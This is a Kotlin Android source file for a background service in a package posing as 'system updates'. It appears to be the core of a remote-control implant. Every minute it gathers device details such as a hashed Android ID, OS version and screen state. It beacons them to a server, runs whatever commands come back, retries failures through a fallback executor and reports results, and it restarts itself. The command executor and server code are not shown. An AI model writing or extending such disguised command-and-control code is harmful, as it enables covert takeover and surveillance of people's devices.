package com.system.updates.core

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import com.system.updates.communication.Communicator
import com.system.updates.communication.CommandExecutor
import com.system.updates.error.ErrorHandler
import com.system.updates.error.FallbackExecutor
import org.json.JSONObject

class BackgroundService : Service() {
    private val tag = "BackgroundService"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var communicator: Communicator
    private lateinit var executor: CommandExecutor
    private lateinit var errorHandler: ErrorHandler
    private lateinit var fallbackExecutor: FallbackExecutor
    private var isRunning = false

    override fun onCreate() {
        super.onCreate()
        Log.i(tag, "Background Service Created.")
        communicator = Communicator(applicationContext)
        executor = CommandExecutor(applicationContext)
        errorHandler = ErrorHandler(applicationContext)
        fallbackExecutor = FallbackExecutor(applicationContext)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(tag, "Background Service Started.")
        if (!isRunning) {
            isRunning = true
            startPeriodicTasks()
        }
        return START_STICKY
    }

    private fun startPeriodicTasks() {
        scope.launch {
            while (isRunning) {
                try {
                    val behavior = collectBehaviorData()
                    val commands = communicator.heartbeat(behavior)
                    commands.forEach { cmd ->
                        try {
                            val result = executor.execute(cmd)
                            communicator.sendResult(cmd, result)
                        } catch (e: Exception) {
                            errorHandler.logError("CMD_EXEC_FAIL", e.message ?: "Unknown", "BackgroundService", cmd.toString(), e)
                            fallbackExecutor.executeWithFallback(cmd.optString("request_type"), cmd, null)
                        }
                    }
                } catch (e: Exception) {
                    errorHandler.logError("BG_SERVICE_ERR", e.message ?: "Unknown", "BackgroundService", null, e)
                }
                delay(60000) // run every minute
            }
        }
    }

    private suspend fun collectBehaviorData(): JSONObject {
        val data = JSONObject()
        try {
            val pm = getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
            data.put("screen_on", pm.isInteractive)
            data.put("power_save", pm.isPowerSavingMode)
            val androidId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
            val hashed = java.security.MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
            data.put("device_hash", android.util.Base64.encodeToString(hashed, android.util.Base64.NO_WRAP))
            data.put("os_version", android.os.Build.VERSION.RELEASE)
            data.put("api_level", android.os.Build.VERSION.SDK_INT)
            data.put("timestamp", System.currentTimeMillis())
        } catch (e: Exception) {
            errorHandler.logError("BEHAVIOR_COLLECT_ERR", e.message ?: "Unknown", "BackgroundService", null, e)
        }
        return data
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        scope.cancel()
        Log.i(tag, "Background Service Destroyed.")
    }
}